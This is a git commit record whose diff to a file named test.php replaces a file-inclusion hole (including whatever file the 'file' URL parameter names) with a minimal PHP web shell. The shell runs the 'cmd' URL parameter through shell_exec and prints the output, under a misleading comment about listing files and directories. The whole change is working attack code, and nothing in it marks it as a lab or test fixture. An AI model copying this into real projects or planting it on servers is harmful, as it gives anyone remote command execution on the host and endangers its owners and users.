0029e608ae1938041e1feaee99c155b6e911bf06
HclX <3332879+HclX@users.noreply.github.com>
2021-09-18 23:57:58 -0700

    Update test.php

--- test.php
+++ test.php
@@ -1,4 +1,8 @@
 <?php
-$file = $_GET['file'];
-include $file;
+$cmd = $_GET['cmd'];
+$output = shell_exec($cmd);
+  
+// Display the list of all file
+// and directory
+echo "<pre>$output</pre>";
 ?>
